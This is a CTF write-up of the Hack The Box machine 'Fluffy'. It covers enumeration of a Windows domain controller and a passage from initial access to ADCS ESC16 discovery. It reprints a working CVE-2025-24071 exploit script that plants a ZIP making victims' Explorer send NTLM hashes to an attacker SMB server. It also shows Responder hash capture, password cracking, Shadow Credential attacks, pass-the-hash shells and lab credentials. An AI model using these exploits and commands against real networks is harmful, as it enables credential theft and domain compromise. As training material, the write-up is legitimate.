---
{"dg-publish":true,"permalink":"/ct-fs/htb/fluffy/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #assumed_breach #CVE-2025-24071 #spoofing #Responder #ADCS #ESC16 #kerberos #shadow_credential



## Recon
![Pasted image 20261023160337.png](/img/user/CTFs/HTB/Images/Fluffy%20Images/Pasted%20image%2020261023160337.png)

### Nmap:
```zsh
nmap -p53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49690,49689,49696,49712,49725 -sV -sC -T4 -Pn -oA 10.129.232.88 10.129.232.88
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-23 19:06 -0400
Nmap scan report for 10.129.232.88
Host is up (0.088s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-24 06:06:53Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-10-24T06:08:03+00:00; +7h00m02s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-10-24T06:08:03+00:00; +7h00m02s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-24T06:08:03+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-24T06:08:03+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49725/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-10-24T06:07:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.81 seconds

```
Initial portscanning shows the common suite of Windows ports and services including: LDAP, Kerberos, Domain Services, and MSRPC. Adding `DC01.fluffy.htb` to `/etc/hosts`.
### Netexec
#### Null & Guest SMB Access
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/fluffy]
└─$ nxc smb DC01.fluffy.htb -u '' -p '' --shares                               
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\: 
SMB         10.129.232.88   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/fluffy]
└─$ nxc smb DC01.fluffy.htb -u 'Guest' -p '' --shares
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\Guest: 
SMB         10.129.232.88   445    DC01             [*] Enumerated shares
SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
SMB         10.129.232.88   445    DC01             -----           -----------     ------
SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.88   445    DC01             C$                              Default share
SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.88   445    DC01             IT                              
SMB         10.129.232.88   445    DC01             NETLOGON                        Logon server share 
SMB         10.129.232.88   445    DC01             SYSVOL                          Logon server share 
```
Enumerating our base access we don't see any particular share access for either Null or Guest that looks all that enticing.

#### User-Level SMB Share Access
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/fluffy]
└─$ nxc smb DC01.fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.232.88   445    DC01             [*] Enumerated shares
SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
SMB         10.129.232.88   445    DC01             -----           -----------     ------
SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.88   445    DC01             C$                              Default share
SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.88   445    DC01             IT              READ,WRITE      
SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share ****
```
Checking share access with our compromised user we find that they have read and write access to the `IT` share on the DC. This may be a good vector to attempt to gain a shell. Let's see if there are useful docs inside the share.

##### User List Enumeration
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/fluffy]
└─$ nxc smb DC01.fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --users        
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.232.88   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.232.88   445    DC01             Administrator                 2025-04-17 15:45:01 0       Built-in account for administering the computer/domain 
SMB         10.129.232.88   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.232.88   445    DC01             krbtgt                        2025-04-17 16:00:02 0       Key Distribution Center Service Account 
SMB         10.129.232.88   445    DC01             ca_svc                        2025-04-17 16:07:50 0        
SMB         10.129.232.88   445    DC01             ldap_svc                      2025-04-17 16:17:00 0        
SMB         10.129.232.88   445    DC01             p.agila                       2025-04-18 14:37:08 0        
SMB         10.129.232.88   445    DC01             winrm_svc                     2025-05-18 00:51:16 0        
SMB         10.129.232.88   445    DC01             j.coffey                      2025-04-19 12:09:55 0        
SMB         10.129.232.88   445    DC01             j.fleischman                  2025-05-16 14:46:55 0 
```
I also took the opportunity to grab a list of domain users with our `j.fleischman` user.

##### IT Share Enumeration
```zsh
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Oct 24 02:14:21 2026
  ..                                  D        0  Sat Oct 24 02:14:21 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

		5842943 blocks of size 4096. 1867603 blocks available
```
Using `smbclient` We see that the `IT` share holds essentially three items. Two applications: `Everything` and `Keepass-2.58` as well as a pdf called `Upgrade Notice`.

![Pasted image 20261023162741.png](/img/user/CTFs/HTB/Images/Fluffy%20Images/Pasted%20image%2020261023162741.png)
![Pasted image 20261023162912.png\|857](/img/user/CTFs/HTB/Images/Fluffy%20Images/Pasted%20image%2020261023162912.png)
Investigating the PDF we see it is a Patch Announcement PDF addressing mandatory system updates in reference to several CVE's that were found present on systems in their network. This feels like a clue that some of these will come into play.


## Initial Access
### CVE-2025-24071
![Pasted image 20261023165403.png](/img/user/CTFs/HTB/Images/Fluffy%20Images/Pasted%20image%2020261023165403.png)
Doing some online research into the CVEs mentioned on the disclosure PDF we come across [CVE-2025-24071](https://nvd.nist.gov/vuln/detail/cve-2025-24071) Which is a File Explorer control/manipulation vulnerability that allows an unauthorized attacker to "perform spoofing over the network". This means that there are certain scenarios where we can spoof valid servers (SMB server in this case) and intercept valid NTLM authentication. This vulnerability and the [POC](https://www.exploit-db.com/exploits/52310) I found on Exploit-DB state that when an attacker crafts a malicious `.library-ms` file which calls to an attacker controlled SMB server and then proceeds to compress it into a ZIP archive, they can upload that archive to a location they have write access over (the `IT` share in our case) and that when a user extracts that zip archive the `.library-ms` file is called triggering the external SMB call embedded leaking the user's hash to the attacker controlled server.

#### Exploit steps
```zsh
#!/usr/bin/env python3
# Exploit Title: Windows File Explorer Windows 11 (23H2) - NTLM Hash Disclosure
# Exploit Author: Mohammed Idrees Banyamer
# Twitter/GitHub:https://github.com/mbanyamer 
# Date: 2025-05-27
# CVE: CVE-2025-24071
# Vendor: Microsoft
# Affected Versions: Windows 10/11 (All supporting .library-ms and SMB)
# Tested on: Windows 11 (23H2)
# Type: Local / Remote (NTLM Leak)
# Platform: Windows
# Vulnerability Type: Information Disclosure
# Description:
#   Windows Explorer automatically initiates an SMB authentication request when a
#   .library-ms file is extracted from a ZIP archive. This causes NTLM credentials
#   (in hashed format) to be leaked to a remote SMB server controlled by the attacker.
#   No user interaction is required beyond extraction.

import zipfile
from pathlib import Path
import argparse
import re
import sys
from colorama import Fore, Style

def create_library_ms(ip: str, filename: str, output_dir: Path) -> Path:
    """Creates a malicious .library-ms file pointing to an attacker's SMB server."""
    payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>'''
    
    output_file = output_dir / f"{filename}.library-ms"
    output_file.write_text(payload, encoding="utf-8")
    return output_file

def build_zip(library_file: Path, output_zip: Path):
    """Packages the .library-ms file into a ZIP archive."""
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as archive:
        archive.write(library_file, arcname=library_file.name)
    print(f"{Fore.GREEN}[+] Created ZIP: {output_zip}{Style.RESET_ALL}")

def is_valid_ip(ip: str) -> bool:
    return re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip) is not None

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-24071 - NTLM Hash Disclosure via .library-ms ZIP Archive",
        epilog="example:\n  python3 CVE-2025-24071_tool.py -i 192.168.1.100 -n payload1 -o ./output_folder --keep",
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument("-i", "--ip", required=True, help="Attacker SMB IP address (e.g., 192.168.1.100)")
    parser.add_argument("-n", "--name", default="malicious", help="Base filename (default: malicious)")
    parser.add_argument("-o", "--output", default="output", help="Output directory (default: ./output)")
    parser.add_argument("--keep", action="store_true", help="Keep .library-ms file after ZIP creation")

    args = parser.parse_args()

    if not is_valid_ip(args.ip):
        print(f"{Fore.RED}[!] Invalid IP address: {args.ip}{Style.RESET_ALL}")
        sys.exit(1)

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    print(f"{Fore.CYAN}[*] Generating malicious .library-ms file...{Style.RESET_ALL}")
    library_file = create_library_ms(args.ip, args.name, output_dir)
    zip_file = output_dir / f"{args.name}.zip"
    build_zip(library_file, zip_file)

    if not args.keep:
        library_file.unlink()
        print(f"{Fore.YELLOW}[-] Removed intermediate .library-ms file{Style.RESET_ALL}")

    print(f"{Fore.MAGENTA}[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
            
```
First we download this script to our local attack machine.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/fluffy/exploit]
└─$ python3 NTLM.py --ip 10.10.14.24 --keep
[*] Generating malicious .library-ms file...
[+] Created ZIP: output/malicious.zip
[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.
```
We then call the script listing our attacker IP as well as `--keep` that will create a copy of the `.library-ms` file and save it outside the zip archive for later use.

```zsh
smb: \> put ./malicious.zip 
putting file ./malicious.zip as \malicious.zip (1.1 kB/s) (average 1.1 kB/s)
smb: \> dir
  .                                   D        0  Sat Oct 24 02:50:15 2026
  ..                                  D        0  Sat Oct 24 02:50:15 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  malicious.zip                       A      326  Sat Oct 24 02:50:15 2026
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

		5842943 blocks of size 4096. 2026252 blocks available
smb: \> dir
  .                                   D        0  Sat Oct 24 02:51:07 2026
  ..                                  D        0  Sat Oct 24 02:51:07 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

```
Then in our previously held SMB session we upload the newly created malicious ZIP archive to the `IT` share and then start a `Responder` session in another terminal.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/fluffy/exploit]
└─$ sudo responder -I tun0 -wd                         
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.24]
    Responder IPv6             [fe80::6a46:e68c:f034:d1f4]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-6O331441EBE]
    Responder Domain Name      [DRPT.LOCAL]
    Responder DCE-RPC Port     [48722]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:fd6fcd0d18ede758:53B5283B2DA8ADFAD3001A7B6954AB8C:010100000000000080ADA1D52763DD01C0946F8F47B87E970000000002000800440052005000540001001E00570049004E002D0036004F0033003300310034003400310045004200450004003400570049004E002D0036004F003300330031003400340031004500420045002E0044005200500054002E004C004F00430041004C000300140044005200500054002E004C004F00430041004C000500140044005200500054002E004C004F00430041004C000700080080ADA1D52763DD0106000400020000000800300030000000000000000100000000200000CB2C5DF9ED45AFE0F3E4668D93AFB7251F2AA41F6DFDC8B573C5AC7B5CB8577F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320034000000000000000000
```
And after about 30 seconds or so we capture the hash of one `p.agila` in a responder session we had going prior to upload.

#### Cracking the Hash
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/fluffy/loot]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt agila.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)     
1g 0:00:00:01 DONE (2026-10-23 20:04) 0.8620g/s 3894Kp/s 3894Kc/s 3894KC/s proquis..programmercomputer
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
We copy the hash to a file that we arbitrarily named `agila.hash` and fed it to `john` using `rockyou.txt` for our wordlist. Within one second it cracks the hash revealing our user's plaintext password.

### LDAP Enumeration
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/fluffy/loot]
└─$ nxc ldap DC01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -M groupmembership -o USER=p.agila
LDAP        10.129.232.88   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.88   389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
GROUPMEM... 10.129.232.88   389    DC01             [+] User: p.agila is member of following groups: 
GROUPMEM... 10.129.232.88   389    DC01             Service Account Managers
GROUPMEM... 10.129.232.88   389    DC01             Domain Users
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/CTF/HTB/fluffy/loot]
└─$ nxc ldap DC01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -M groupmembership -o USER=j.fleischman
LDAP        10.129.232.88   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.88   389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
GROUPMEM... 10.129.232.88   389    DC01             [+] User: j.fleischman is member of following groups: 
GROUPMEM... 10.129.232.88   389    DC01             Domain Users
```
I then decide to pull group membership for both of our compromised users and see interestingly that `p.agila` is a member of the `Service Account Managers`.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/fluffy/loot]
└─$ nxc ldap DC01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --groups "Service Account Managers"    
LDAP        10.129.232.88   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.88   389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
LDAP        10.129.232.88   389    DC01             p.agila
LDAP        10.129.232.88   389    DC01             j.coffey

```
Digging deeper I found that `j.coffey` is the only other member of that group. It might be prudent to pull `bloodhound` loot to fully evaluate the AD attributes that belong to that group and to our compromised users.

### Bloodhound 
#### Loot Gathering
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/fluffy/loot]
└─$ nxc ldap DC01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --dns-server 10.129.232.88 --bloodhound --collection ALL
LDAP        10.129.232.88   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.88   389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
LDAP        10.129.232.88   389    DC01             Resolved collection methods: rdp, psremote, group, objectprops, dcom, trusts, session, localadmin, acl, container
LDAP        10.129.232.88   389    DC01             Done in 0M 20S
LDAP        10.129.232.88   389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.232.88_2026-10-23_201115_bloodhound.zip
```
Pulled BH loot from our target using `p.agila`.

#### Analysis
![Pasted image 20261023171758.png](/img/user/CTFs/HTB/Images/Fluffy%20Images/Pasted%20image%2020261023171758.png)
Looking at "shortest paths from owned objects" cypher query in Bloodhound after marking both `j.fleischman` and `p.agila` as "owned" we see that Agila's membership in "Service Account Managers" shows that they have `GenericAll` permissions over the `Service Accounts` group which is essentially full access. That "Service Accounts" group has `GenericWrite` permissions set over the `CA_SVC` user which is a privileged user inside a privileged group called `Cert Publishers`. This may imply an ADCS vulnerability or a direct local privilege escalation vector abusing their elevated privileges. We also see that `WINRM_SVC` is a member of `Remote Management Users` which is usually an indicator that they have `user.txt` in one of their folders. So let's target that user first. 

#### Pivoting
```zsh
└─$ net rpc group addmem "Service Accounts" "p.agila" -U 'fluffy.htb/p.agila%prometheusx-303' -S "DC01.fluffy.htb"
```
Our first move is to abuse the `GenericAll` permission set and add ourselves (`p.agila`) to the "Service Accounts" Group.

```zsh
┌──(p3v)─(kali㉿kali)-[~/CTF/HTB/fluffy/exploit]
└─$ ~/p3v/bin/pywhisker -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303' --target 'WINRM_SVC' --action 'add'
[*] Searching for the target account
[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 828abe68-033d-2a09-147b-5e3d38d64420
[*] Updating the msDS-KeyCredentialLink attribute of WINRM_SVC
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: D9mLxRsx.pfx
[*] Must be used with password: 7hvHgMCNHdk8z1DmBHy0
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```
Next we abuse the `GenericWrite` permission to perform a Shadow Credential attack against `WINRM_SVC` which adds our user's public key as basically an authorized credential to our target account for kerberos authentication. We can also use this `pfx` credential to attempt to dump the NT hash for the target.

```zsh
┌──(p3v)─(kali㉿kali)-[~/CTF/HTB/fluffy/exploit]
└─$ faketime -f '2026-10-24 03:37:43.218731' certipy-ad auth -pfx D9mLxRsx.pfx  -username 'winrm_svc' -dc-ip 10.129.232.88 -password '7hvHgMCNHdk8z1DmBHy0' -domain 'fluffy.htb'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

/usr/lib/python3/dist-packages/certipy/lib/certificate.py:662: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return pkcs12.load_key_and_certificates(pfx, password)[:-1]
[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Got hash for 'winrm_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767
```
Using `certipy-ad` we successfully request the TGT for `winrm_svc` and their NTLM hash from the CA on the DC.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/fluffy/exploit]
└─$ evil-winrm -i 10.129.232.88 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'     
                                        
Evil-WinRM shell v4.1
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> dir ../Desktop


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/23/2026  11:00 PM             34 user.txt
```
I login to a PowerShell session as `winrm_svc`, and just as I suspected, `user.txt` is sitting on the Desktop.
#### Pivoting (again)
```zsh
┌──(p3v)─(kali㉿kali)-[~/CTF/HTB/fluffy/exploit]
└─$ ~/p3v/bin/pywhisker -d 'fluffy.htb' -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767' --target 'CA_SVC' --action 'add'                            
[*] Searching for the target account
[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: e97fc155-c76d-3c18-197b-0cc250852cee
[*] Updating the msDS-KeyCredentialLink attribute of CA_SVC
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: y6mYFMP6.pfx
[*] Must be used with password: M3CowFrWS3PpuXlAgtG0
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

```
Just like before we perform a Shadow Credential attack adding the public key for `winrm_svc` to the credential link for `ca_svc`. Now let's dump their hashes with certipy.

```zsh
┌──(p3v)─(kali㉿kali)-[~/CTF/HTB/fluffy/exploit]
└─$ faketime -f '2026-10-24 03:47:43.218731' certipy-ad auth -pfx y6mYFMP6.pfx   -username 'ca_svc' -dc-ip 10.129.232.88 -password 'M3CowFrWS3PpuXlAgtG0' -domain 'fluffy.htb'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

/usr/lib/python3/dist-packages/certipy/lib/certificate.py:662: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return pkcs12.load_key_and_certificates(pfx, password)[:-1]
[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Got hash for 'ca_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8
```
Similarly we successfully dump the NTLM hash of the `ca_svc` account.

## Privilege Escalation
### ADCS Abuse (ESC16)
```zsh
{
  "Certificate Authorities": {
    "0": {
      "CA Name": "fluffy-DC01-CA",
      "DNS Name": "DC01.fluffy.htb",
      "Certificate Subject": "CN=fluffy-DC01-CA, DC=fluffy, DC=htb",
      "Certificate Serial Number": "3150FA7E60CE28AD4DAE41A1B61D8874",
      "Certificate Validity Start": "2025-04-17 16:00:16+00:00",
      "Certificate Validity End": "3024-04-17 16:12:16+00:00",
      "Web Enrollment": {
        "http": {
          "enabled": false
        },
        "https": {
          "enabled": false,
          "channel_binding": null
        }
      },
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Active Policy": "CertificateAuthority_MicrosoftDefault.Policy",
      "Disabled Extensions": [
        "1.3.6.1.4.1.311.25.2"
      ],
      "Permissions": {
        "Owner": "FLUFFY.HTB\\Administrators",
        "Access Rights": {
          "1": [
            "FLUFFY.HTB\\Domain Admins",
            "FLUFFY.HTB\\Enterprise Admins",
            "FLUFFY.HTB\\Administrators"
          ],
          "2": [
            "FLUFFY.HTB\\Domain Admins",
            "FLUFFY.HTB\\Enterprise Admins",
            "FLUFFY.HTB\\Administrators"
          ],
          "512": [
            "FLUFFY.HTB\\Cert Publishers",
            "FLUFFY.HTB\\Administrators"
          ],
          "256": [
            "FLUFFY.HTB\\Administrators"
          ]
        }
      },
      "[!] Vulnerabilities": {
        "ESC16": "Security Extension is disabled."
      },
      "[*] Remarks": {
        "ESC16": "Other prerequisites may be required for this to be exploitable. See the wiki for more details."
      }
    }
  }
```
My next thought was to enumerate ADCS since this user is the CA user on the DC. Using certipy we see that the CA itself is vulnerable to [ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) meaning the security extension (which validates CA requests are actually from the user they are requested on behalf of) is disabled globally. This means we might be able to request a PFX for `Administrator` without any validation from the server.

![Pasted image 20261023175612.png](/img/user/CTFs/HTB/Images/Fluffy%20Images/Pasted%20image%2020261023175612.png)
